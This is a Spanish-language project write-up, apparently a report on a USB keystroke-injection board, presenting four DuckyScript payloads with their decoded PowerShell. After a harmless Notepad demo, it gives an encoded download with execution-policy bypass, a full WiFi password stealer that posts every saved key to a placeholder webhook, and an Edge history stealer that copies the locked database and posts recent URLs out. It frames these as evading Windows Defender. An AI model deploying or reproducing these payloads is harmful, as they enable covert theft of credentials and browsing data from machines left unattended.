
---

### 1. `01_notepad.dd` (Prueba de Concepto Básica)

**¿Qué hace?** Abre el Bloc de Notas y escribe un texto. Demuestra que la placa es reconocida como un teclado HID y puede inyectar pulsaciones.

**Valor para el informe:** Demuestra el entendimiento del *Timing* (los `DELAY` son necesarios para que Windows procese las ventanas).

*Este payload no usa PowerShell, por lo que el script original y el `.dd` son idénticos.*

**Archivo `.dd` (DuckyScript puro):**
```text
DELAY 3000
GUI r
DELAY 1000
STRING notepad
DELAY 500
ENTER
DELAY 2000
STRING Hello World!
```

---

### 2. `02_download_base64.dd` (Descarga y Evasión Básica)

**¿Qué hace?** Abre CMD (para evadir el límite de 260 caracteres de Win+R) y usa PowerShell con un comando en Base64 para descargar un archivo HTML desde internet a la carpeta temporal.

**Valor para el informe:** Es la primera prueba de evasión. Demuestra cómo el uso de `cmd` y `-EncodedCommand` permite superar los límites del sistema y eludir la detección de firmas de texto plano.

**Script original (Unencoded) - Lo que realmente hace:**
```powershell
Invoke-WebRequest -Uri 'https://www.google.com' -OutFile '$env:TEMP\google.html'
```

**Archivo `.dd` (Encoded):**
```text
DELAY 2000
GUI r
DELAY 1000
STRING cmd
ENTER
DELAY 1500
STRING powershell -NoP -Exec Bypass -EncodedCommand [CADENA_BASE64_ANONIMIZADA]
DELAY 5000
ENTER
```

---

### 3. `03_wifi_stealer.dd` (Exfiltración Avanzada)

**¿Qué hace?** Abre CMD, ejecuta un script de PowerShell en Base64 que recorre **todas** las redes WiFi guardadas, extrae sus contraseñas y envía la lista completa por HTTP POST a un servidor (Webhook).

**Valor para el informe:** Es el "ataque estrella" del proyecto. Demuestra la técnica *Living off the Land* (LotL) al usar `netsh` (herramienta nativa) ofuscada, logrando extraer credenciales reales sin activar Windows Defender.

**Script original (Unencoded) - Lo que realmente hace:**
```powershell
$ErrorActionPreference = "SilentlyContinue"; 
$out = ""; 
$profiles = (netsh wlan show profiles) | Select-String ":"; 
foreach ($p in $profiles) { 
    try { 
        $name = ($p.ToString().Split(":")[1]).Trim(); 
        if ($name.Length -gt 0) { 
            $pass = (netsh wlan show profile name="$name" key=clear) | Select-String "Contenido de la clave|Key Content"; 
            if ($pass) { 
                $val = ($pass.ToString().Split(":")[1]).Trim(); 
                $out += "$name : $val `n" 
            } else { 
                $out += "$name : [Sin Clave] `n" 
            } 
        } 
    } catch {} 
}; 
if ($out -eq "") { $out = "No se encontraron redes" }; 
Invoke-RestMethod -Uri "https://[ENDPOINT_CONTROLADO]" -Method Post -Body $out
```

**Archivo `.dd` (Encoded):**
```text
DELAY 2000
GUI r
DELAY 1000
STRING cmd
ENTER
DELAY 1500
STRING powershell -NoP -Exec Bypass -EncodedCommand [CADENA_BASE64_ANONIMIZADA]
DELAY 5000
ENTER
```

---

### 4. `04_history_stealer.dd` (Extracción de Datos Locales)

**¿Qué hace?** Abre CMD, ejecuta un script en Base64 que busca la base de datos del historial de Edge, la copia a la carpeta temporal (para evadir el bloqueo del navegador), usa Regex para extraer las últimas 20 URLs y las envía al Webhook.

**Valor para el informe:** Demuestra la capacidad de evadir el bloqueo de archivos (File Locks) y la extracción de información sensible (hábitos de navegación) sin usar herramientas de SQLite externas, manteniendo el ataque *Fileless*.

**Script original (Unencoded) - Lo que realmente hace:**
```powershell
$files = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Filter "History" -Recurse -ErrorAction SilentlyContinue; 
if ($files) { 
    $out = ""; 
    foreach ($file in $files) { 
        $temp = "$env:TEMP\eh.db"; 
        Copy-Item $file.FullName $temp -Force; 
        $bytes = [System.IO.File]::ReadAllBytes($temp); 
        $text = [System.Text.Encoding]::ASCII.GetString($bytes); 
        $urls = [regex]::Matches($text, "https?://[a-zA-Z0-9\.\-_/]+") | ForEach-Object { $_.Value } | Select-Object -Unique | Select-Object -Last 20; 
        $out += ($urls -join "`n") + "`n" 
    }; 
    Invoke-RestMethod -Uri "https://[ENDPOINT_CONTROLADO]" -Method Post -Body $out 
} else { 
    Invoke-RestMethod -Uri "https://[ENDPOINT_CONTROLADO]" -Method Post -Body "No se encontro Edge o no tiene historial" 
}
```

**Archivo `.dd` (Encoded):**
```text
DELAY 2000
GUI r
DELAY 1000
STRING cmd
ENTER
DELAY 1500
STRING powershell -NoP -Exec Bypass -EncodedCommand [CADENA_BASE64_ANONIMIZADA]
DELAY 5000
ENTER
```

---
